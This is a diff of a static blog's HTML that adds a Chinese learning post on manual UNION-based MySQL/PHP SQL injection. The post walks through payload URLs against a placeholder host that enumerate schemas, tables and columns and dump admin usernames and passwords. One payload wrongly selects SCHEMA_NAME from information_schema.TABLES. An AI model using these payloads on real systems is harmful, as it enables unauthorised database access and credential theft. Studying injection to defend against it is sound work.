@@ -77,6 +77,52 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-sql3rdday" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2023/11/21/sql3rdday/" class="article-date">
+  <time class="dt-published" datetime="2023-11-21T15:27:11.000Z" itemprop="datePublished">2023-11-21</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2023/11/21/sql3rdday/">sql3rdday</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>主题：mysql+php手工注入篇 爆库 爆表 爆字段<br>一、查询所有的库<br>group_concat()查询库名<br>eg:<a target="_blank" rel="noopener" href="http://target_sys.com/article.php?id=-1">http://target_sys.com/article.php?id=-1</a> union select 1,2,SCHEMA_NAME from information_schema.SCHEMATA limit 0,1   （之后把0依次3换为1，2，3等等）<br>或  <a target="_blank" rel="noopener" href="http://target_sys.com/article.php?id=-1">http://target_sys.com/article.php?id=-1</a> union select 1,2,group_concat(SCHEMA_NAME) from information_schema.SCHEMATA </p>
+<p>二、查询库里所有的表<br>eg:<a target="_blank" rel="noopener" href="http://target_sys.com/article.php?id=-1">http://target_sys.com/article.php?id=-1</a> union select 1,2,group_concat(SCHEMA_NAME) from information_schema.TABLES where TABLE_SCHEMA&#x3D;database()</p>
+<p>三、查询表里所有字段<br>eg:<a target="_blank" rel="noopener" href="http://target_sys.com/article.php?id=-1">http://target_sys.com/article.php?id=-1</a> union select 1,2,group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME&#x3D;0x61646d696e  (16进制数为admin转16进制)</p>
+<p>四、查询数据<br>eg:<a target="_blank" rel="noopener" href="http://target_sys.com/article.php?id=-1">http://target_sys.com/article.php?id=-1</a> union select 1,2,group_concat(username,0x3a,password) from admin </p>
+<p>五、查询失败的原因<br>有时候查询不全，原因是字段大小问题。<br>解决方法：换一个字段查询，或用函数查询长度再用字符串函数截取</p>
+<p>六、方法特点<br>速度快，但不通用(可能查不全）</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2023/11/21/sql3rdday/" data-id="clp8itpcv0008kgcaezjc3utx" data-title="sql3rdday" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">SQL注入</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-sql2ndday" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2023/11/20/sql2ndday/" class="article-date">
@@ -110,7 +156,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2023/11/20/sql2ndday/" data-id="clp74prap0001zgcado7nh5vl" data-title="web入门SQL注入第二天" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2023/11/20/sql2ndday/" data-id="clp8itpcs0002kgca34v84xko" data-title="web入门SQL注入第二天" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -164,7 +210,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2023/11/15/sql1stday/" data-id="clp74praq0002zgcac3ky99x4" data-title="web入门SQL注入第一天" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2023/11/15/sql1stday/" data-id="clp8itpcr0001kgca1odahpvs" data-title="web入门SQL注入第一天" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -204,7 +250,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2023/11/08/newpapername/" data-id="clp74prat0007zgcagio03pr6" data-title="web入门第一天" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2023/11/08/newpapername/" data-id="clp8itpcv0007kgca86wyhrac" data-title="web入门第一天" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -257,7 +303,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2023/11/06/hello-world/" data-id="clp74pram0000zgcah1of1ym9" data-title="Hello World" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2023/11/06/hello-world/" data-id="clp8itpcp0000kgcae1l671k4" data-title="Hello World" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -312,6 +358,10 @@
     <h3 class="widget-title">Recent Posts</h3>
     <div class="widget">
       <ul>
+        
+          <li>
+            <a href="/2023/11/21/sql3rdday/">sql3rdday</a>
+          </li>
         
           <li>
             <a href="/2023/11/20/sql2ndday/">web入门SQL注入第二天</a>
